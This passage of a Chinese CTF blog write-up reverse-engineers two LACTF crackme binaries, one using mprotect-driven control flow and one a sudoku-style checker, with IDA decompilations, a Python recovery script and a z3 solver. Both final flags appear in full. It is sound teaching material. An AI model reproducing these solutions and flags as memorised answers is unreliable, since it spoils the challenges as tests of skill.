<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 - <span class="number">48</span> != all_num % <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  all_num /= <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( count == <span class="number">3</span> )</span><br><span class="line">    flag = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    flag = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//underline:</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_70000</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !(a1 * a1 % <span class="number">9024</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  flag = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//reset:</span></span><br><span class="line">__int64 __fastcall <span class="title function_">reset</span><span class="params">(<span class="type">char</span> flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( flag )</span><br><span class="line">    v1 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v1 = <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_71850(lowcase, <span class="number">4096LL</span>, v1) == <span class="number">-1</span> )</span><br><span class="line">    sub_717C0();</span><br><span class="line">  <span class="keyword">if</span> ( flag == <span class="number">1</span> )</span><br><span class="line">    v2 = <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v2 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_71850(num, <span class="number">4096LL</span>, v2) == <span class="number">-1</span> )</span><br><span class="line">    sub_717C0();</span><br><span class="line">  <span class="keyword">if</span> ( flag == <span class="number">2</span> )</span><br><span class="line">    v3 = <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v3 = <span class="number">3</span>;</span><br><span class="line">  result = sub_71850(underline, <span class="number">4096LL</span>, v3);</span><br><span class="line">  <span class="keyword">if</span> ( result == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> sub_717C0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sub_710F9</span></span><br><span class="line">__int64 __fastcall <span class="title function_">sub_710F9</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; dword_70AE4; ++i )</span><br><span class="line">    byte_70B00[i] = (byte_70B00[i] - <span class="number">96</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">  *(a3 + <span class="number">144</span>) = <span class="number">1LL</span>;</span><br><span class="line">  result = a3;</span><br><span class="line">  *(a3 + <span class="number">168</span>) = **(a3 + <span class="number">160</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过栈帧可以得知<code>sub_71850()</code>实际上是<code>mprotect()</code>  直接点进去看不到</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/23/20240223-224117.png" alt="image-20240223224117646"></p>
<p><code>mprotect()</code>可以设置程序对函数的权限(wrx) 7对应的就是wrx 3对应wr 所以被设置为7的函数可以执行 程序就是靠这个函数控制控制流的 据此可以分析出程序的所有逻辑:</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">1.读取到特定字母会导致count<span class="built_in">_</span>2 += 1</span><br><span class="line">2.读取到字母会向byte<span class="built_in">_</span>70B00中添加对应字母</span><br><span class="line">3.除了第2, 8, 9, 12个特定字母以外特定字母后必须跟数字</span><br><span class="line">4.字母d后必须跟下划线</span><br><span class="line">5.普通字母后必须跟字母</span><br><span class="line">6.第三个特殊字母后的第一个数字必须跟下划线</span><br><span class="line">7.否则数字后必须跟字母</span><br><span class="line">8.下划线后必须跟字母</span><br></pre></td></tr></table></figure>

<p>动调中还发现读取到字母时就会触发两次main中的<code>v4[0] = sub_710F9</code>(不清楚原理 mprotect导致调试器无法正常触发断点 无法查看这个函数的汇编代码 估计是通过异常处理触发的) 据此写出脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;vwbowpcjrhpkobfryuryuryu&quot;</span>]</span><br><span class="line">number_table = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;10430031&quot;</span>]</span><br><span class="line">special = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;bchst&quot;</span>]</span><br><span class="line">flag = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;lactf&#123;&quot;</span>]</span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">f2 = <span class="number">0</span></span><br><span class="line">ind = <span class="number">6</span></span><br><span class="line">ind_for_num = <span class="number">0</span></span><br><span class="line">ind_for_alpha = <span class="number">0</span></span><br><span class="line">ind_for_alpha_in_table = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(ind &lt;= <span class="number">33</span>):</span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span>:</span><br><span class="line">        now = (key[ind_for_alpha] - <span class="number">97</span> + <span class="number">100</span> * <span class="number">26</span> - <span class="number">2</span> * (<span class="number">34</span> - ind)) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line">        flag.append(<span class="built_in">chr</span>(now))</span><br><span class="line">        ind += <span class="number">1</span></span><br><span class="line">        ind_for_alpha += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> now <span class="keyword">in</span> special:</span><br><span class="line">            ind_for_alpha_in_table += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> ind_for_alpha_in_table != <span class="number">2</span> <span class="keyword">and</span> ind_for_alpha_in_table != <span class="number">8</span> <span class="keyword">and</span> ind_for_alpha_in_table != <span class="number">9</span> <span class="keyword">and</span> ind_for_alpha_in_table != <span class="number">12</span>:</span><br><span class="line">                f = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> now == <span class="number">100</span>:</span><br><span class="line">            f = <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> ind_for_alpha_in_table == <span class="number">3</span>:</span><br><span class="line">            f2 = <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">        now = number_table[ind_for_num]</span><br><span class="line">        flag.append(now)</span><br><span class="line">        ind += <span class="number">1</span></span><br><span class="line">        ind_for_num += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> f2:</span><br><span class="line">            f = <span class="number">2</span></span><br><span class="line">            f2 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">2</span>:</span><br><span class="line">        flag.append(<span class="string">&quot;_&quot;</span>)</span><br><span class="line">        ind += <span class="number">1</span></span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># lactf&#123;rub1sc0_b4s3d_ph0t0synth3s1s&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="puzzlepalooza-Z3"><a href="#puzzlepalooza-Z3" class="headerlink" title="puzzlepalooza | Z3"></a><strong>puzzlepalooza</strong> | Z3</h2><p>DIE查壳 无壳64x IDA64打开:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v18; <span class="comment">// r14d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v19; <span class="comment">// edx</span></span><br><span class="line">  __m128i key; <span class="comment">// [rsp+0h] [rbp-F8h]</span></span><br><span class="line">  __m128i v21[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-E8h]</span></span><br><span class="line">  __int128 v22[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-C8h] BYREF</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+50h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [rsp+58h] [rbp-A0h]</span></span><br><span class="line">  __int16 v25; <span class="comment">// [rsp+5Ch] [rbp-9Ch]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [rsp+5Eh] [rbp-9Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">152</span>]; <span class="comment">// [rsp+60h] [rbp-98h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the greatest puzzlepalooza ever!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you solve our puzzle without looking?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) == <span class="number">54</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = s;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    key = _mm_load_si128(&amp;xmmword_5632A397C0E0);</span><br><span class="line">    v21[<span class="number">0</span>] = _mm_load_si128(&amp;xmmword_5632A397C0F0);</span><br><span class="line">    *(v21 + <span class="number">9</span>) = _mm_load_si128(&amp;xmmword_5632A397C100);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *v3 - <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt; <span class="number">0x3F</span>u )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      key.get_sbyte[v4 &gt;&gt; <span class="number">3</span>] ^= v5 &lt;&lt; (v4 &amp; <span class="number">7</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (v4 &amp; <span class="number">7u</span>) &gt; <span class="number">2</span> )</span><br><span class="line">        key.get_sbyte[(v4 &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>] ^= v5 &gt;&gt; (<span class="number">8</span> - (v4 &amp; <span class="number">7</span>));</span><br><span class="line">      v4 += <span class="number">6</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">324</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (key.get_sbyte[<span class="number">0</span>] &amp; <span class="number">0xF</span>u) &lt;= <span class="number">8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( ++v7 != <span class="number">81</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ((key.get_ubyte[v7 &gt;&gt; <span class="number">1</span>] &gt;&gt; (<span class="number">4</span> * (v7 &amp; <span class="number">1</span>))) &amp; <span class="number">0xF</span>u) &gt; <span class="number">8</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">          &#125;</span><br><span class="line">          v8 = v22;</span><br><span class="line">          v25 = <span class="number">1871</span>;</span><br><span class="line">          v23 = <span class="number">0x64A0847033B0136</span>LL;</span><br><span class="line">          v22[<span class="number">0</span>] = _mm_load_si128(&amp;xmmword_5632A397C0C0);</span><br><span class="line">          v24 = <span class="number">38667339</span>;</span><br><span class="line">          v22[<span class="number">1</span>] = _mm_load_si128(&amp;xmmword_5632A397C0D0);</span><br><span class="line">          <span class="keyword">while</span> ( v8[<span class="number">1</span>] == ((key.get_ubyte[*v8 &gt;&gt; <span class="number">1</span>] &gt;&gt; (<span class="number">4</span> * (*v8 &amp; <span class="number">1</span>))) &amp; <span class="number">0xF</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 += <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> ( &amp;v26 == v8 )</span><br><span class="line">            &#123;</span><br><span class="line">              v9 = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                v10 = v9;</span><br><span class="line">                v11 = <span class="number">0</span>;</span><br><span class="line">                v12 = <span class="number">0</span>;</span><br><span class="line">                v13 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">9</span>; ++i )</span><br><span class="line">                &#123;</span><br><span class="line">                  v13 ^= <span class="number">1</span> &lt;&lt; ((key.get_ubyte[(i + <span class="number">9</span> * v9) &gt;&gt; <span class="number">1</span>] &gt;&gt; (<span class="number">4</span> * ((i + <span class="number">9</span> * v9) &amp; <span class="number">1</span>))) &amp; <span class="number">0xF</span>);</span><br><span class="line">                  v15 = v10;</span><br><span class="line">                  v16 = <span class="number">4</span> * (v10 &amp; <span class="number">1</span>);</span><br><span class="line">                  v10 += <span class="number">9</span>;</span><br><span class="line">                  v12 ^= <span class="number">1</span> &lt;&lt; ((key.get_ubyte[v15 &gt;&gt; <span class="number">1</span>] &gt;&gt; v16) &amp; <span class="number">0xF</span>);</span><br><span class="line">                  v17 = i / <span class="number">3</span> + v9 - v9 % <span class="number">3</span>;</span><br><span class="line">                  v18 = <span class="number">3</span> * (i / <span class="number">3</span>);</span><br><span class="line">                  v19 = i;</span><br><span class="line">                  v11 ^= <span class="number">1</span> &lt;&lt; ((key.get_ubyte[(<span class="number">3</span> * (v9 % <span class="number">3</span>) + v19 - v18 + <span class="number">9</span> * v17) &gt;&gt; <span class="number">1</span>] &gt;&gt; (<span class="number">4</span></span><br><span class="line">                                                                                           * ((<span class="number">3</span> * (v9 % <span class="number">3</span>)</span><br><span class="line">                                                                                             + v19</span><br><span class="line">                                                                                             - v18</span><br><span class="line">                                                                                             + <span class="number">9</span> * v17) &amp; <span class="number">1</span>))) &amp; <span class="number">0xF</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( v12 != <span class="number">511</span> || v13 != <span class="number">511</span> || v11 != <span class="number">511</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">if</span> ( ++v9 == <span class="number">9</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">puts</span>(<span class="string">&quot;Woah! You&#x27;re so good at puzzles!&quot;</span>);</span><br><span class="line">                  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s not a valid solution you silly goose!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>z3求解符合条件的flag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">key = [ <span class="number">0x08</span>, <span class="number">0x6B</span>, <span class="number">0xD0</span>, <span class="number">0xFE</span>, <span class="number">0x49</span>, <span class="number">0xCB</span>, <span class="number">0xAC</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>, <span class="number">0xF7</span>, </span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0xBA</span>, <span class="number">0x4B</span>, <span class="number">0xAE</span>, <span class="number">0x95</span>, <span class="number">0x69</span>, <span class="number">0x08</span>, <span class="number">0xF3</span>, <span class="number">0xBC</span>, <span class="number">0x4E</span>, </span><br><span class="line">        <span class="number">0xED</span>, <span class="number">0x18</span>, <span class="number">0x4A</span>, <span class="number">0x6B</span>, <span class="number">0xE0</span>, <span class="number">0xDE</span>, <span class="number">0xF4</span>, <span class="number">0x42</span>, <span class="number">0xE5</span>, <span class="number">0xD3</span>, </span><br><span class="line">        <span class="number">0xD9</span>, <span class="number">0xA8</span>, <span class="number">0x3C</span>, <span class="number">0xCF</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x71</span>, <span class="number">0x0E</span>, <span class="number">0x16</span>, <span class="number">0x16</span>, </span><br><span class="line">        <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">key2 = [<span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, </span><br><span class="line">        <span class="number">0x15</span>, <span class="number">0x07</span>, <span class="number">0x18</span>, <span class="number">0x04</span>, <span class="number">0x19</span>, <span class="number">0x05</span>, <span class="number">0x1C</span>, <span class="number">0x03</span>, <span class="number">0x20</span>, <span class="number">0x04</span>, </span><br><span class="line">        <span class="number">0x21</span>, <span class="number">0x05</span>, <span class="number">0x22</span>, <span class="number">0x08</span>, <span class="number">0x26</span>, <span class="number">0x05</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x08</span>, </span><br><span class="line">        <span class="number">0x35</span>, <span class="number">0x06</span>, <span class="number">0x36</span>, <span class="number">0x01</span>, <span class="number">0x3B</span>, <span class="number">0x03</span>, <span class="number">0x47</span>, <span class="number">0x08</span>, <span class="number">0x4A</span>, <span class="number">0x06</span>, </span><br><span class="line">        <span class="number">0x4B</span>, <span class="number">0x04</span>, <span class="number">0x4E</span>, <span class="number">0x02</span>, <span class="number">0x4F</span>, <span class="number">0x07</span>]</span><br><span class="line">masks = [<span class="number">240</span>, <span class="number">240</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">240</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">240</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">240</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">240</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">key_after_mask = [<span class="number">96</span>, <span class="number">80</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">114</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">114</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag_%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>)]</span><br><span class="line">s.add(And([And(flag[i] &lt; <span class="number">0x7f</span>, flag[i] &gt; <span class="number">0x40</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>)]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">54</span> * <span class="number">6</span>, <span class="number">6</span>):</span><br><span class="line">    v5 = ((flag[<span class="built_in">int</span>(i / <span class="number">6</span>)] - <span class="number">0x40</span>) &lt;&lt; (i &amp; <span class="number">7</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    key[i &gt;&gt; <span class="number">3</span>] ^= v5</span><br><span class="line">    <span class="keyword">if</span> (i &amp; <span class="number">7</span>) &gt; <span class="number">2</span>:</span><br><span class="line">        v6 = ((flag[<span class="built_in">int</span>(i / <span class="number">6</span>)] - <span class="number">0x40</span>) &gt;&gt; (<span class="number">8</span> - (i &amp; <span class="number">7</span>))) &amp; <span class="number">0xff</span></span><br><span class="line">        key[(i &gt;&gt; <span class="number">3</span>) + <span class="number">1</span>] ^= v6</span><br><span class="line">s.add(And([And([(key[i] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span> &lt;= <span class="number">8</span>, key[i] &amp; <span class="number">0xf</span> &lt;= <span class="number">8</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    s.add(key[i] &amp; masks[i] == key_after_mask[i])</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    v11 = <span class="number">0</span></span><br><span class="line">    v12 = <span class="number">0</span></span><br><span class="line">    v13 = <span class="number">0</span></span><br><span class="line">    count = <span class="built_in">round</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        temp1 = BitVec(<span class="string">&quot;temp1&quot;</span>, <span class="number">12</span>)</span><br><span class="line">        temp2 = BitVec(<span class="string">&quot;temp2&quot;</span>, <span class="number">12</span>)</span><br><span class="line">        temp1 = <span class="number">1</span></span><br><span class="line">        temp2 = key[(i + <span class="number">9</span> * <span class="built_in">round</span>) &gt;&gt; <span class="number">1</span>]</span><br><span class="line">        temp2 &gt;&gt;= <span class="number">4</span> * ((i + <span class="number">9</span> * <span class="built_in">round</span>) &amp; <span class="number">1</span>)</span><br><span class="line">        temp2 &amp;= <span class="number">0xf</span></span><br><span class="line">        temp1 &lt;&lt;= temp2</span><br><span class="line">        v13   ^= temp1</span><br><span class="line">        v15   = count</span><br><span class="line">        temp1 = <span class="number">1</span></span><br><span class="line">        temp2 = key[count &gt;&gt; <span class="number">1</span>]</span><br><span class="line">        temp2 &gt;&gt;= <span class="number">4</span> * (count &amp; <span class="number">1</span>)</span><br><span class="line">        temp2 &amp;= <span class="number">0xf</span></span><br><span class="line">        temp1 &lt;&lt;= temp2</span><br><span class="line">        v12   ^= temp1</span><br><span class="line">        temp1 = <span class="number">1</span></span><br><span class="line">        v17 = <span class="built_in">int</span>(i / <span class="number">3</span>) + <span class="built_in">round</span> - <span class="built_in">round</span> % <span class="number">3</span></span><br><span class="line">        v18 = <span class="number">3</span> * <span class="built_in">int</span>(i / <span class="number">3</span>)</span><br><span class="line">        temp2 = key[(<span class="number">3</span> * (<span class="built_in">round</span> % <span class="number">3</span>) + i - v18 + <span class="number">9</span> * v17) &gt;&gt; <span class="number">1</span>]</span><br><span class="line">        temp2 &gt;&gt;= <span class="number">4</span> * ((<span class="number">3</span> * (<span class="built_in">round</span> % <span class="number">3</span>) + i - v18 + <span class="number">9</span> * v17) &amp; <span class="number">1</span>)</span><br><span class="line">        temp2 &amp;= <span class="number">0xf</span></span><br><span class="line">        temp1 &lt;&lt;= temp2</span><br><span class="line">        v11   ^= temp1</span><br><span class="line">        count += <span class="number">9</span></span><br><span class="line">    s.add(And(v11 == <span class="number">0x1FF</span>, v12 == <span class="number">0x1FF</span>, v13 == <span class="number">0x1FF</span>))</span><br><span class="line">final_key = [BitVec(<span class="string">&#x27;final_key_%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>):</span><br><span class="line">    s.add(final_key[i] == key[i])</span><br><span class="line">s.add(flag[<span class="number">0</span>] == <span class="built_in">ord</span>(<span class="string">&quot;l&quot;</span>), flag[<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>), flag[<span class="number">2</span>] == <span class="built_in">ord</span>(<span class="string">&quot;c&quot;</span>), flag[<span class="number">3</span>] == <span class="built_in">ord</span>(<span class="string">&quot;t&quot;</span>), flag[<span class="number">4</span>] == <span class="built_in">ord</span>(<span class="string">&quot;f&quot;</span>), flag[<span class="number">5</span>] == <span class="built_in">ord</span>(<span class="string">&quot;&#123;&quot;</span>), flag[<span class="number">53</span>] == <span class="built_in">ord</span>(<span class="string">&quot;&#125;&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">54</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(m[flag[i]].as_long()), end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="comment"># for i in range(41):</span></span><br><span class="line">    <span class="comment">#     print(hex(m[final_key[i]].as_long()), end = &quot;, &quot;)</span></span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line">    condition = []</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> m:</span><br><span class="line">        condition.append(d() != m[d])</span><br><span class="line">    s.add(Or(condition))</span><br><span class="line"><span class="comment"># lactf&#123;looking_at_the_puzzles_is_honestly_so_overrated&#125;</span></span><br></pre></td></tr></table></figure>

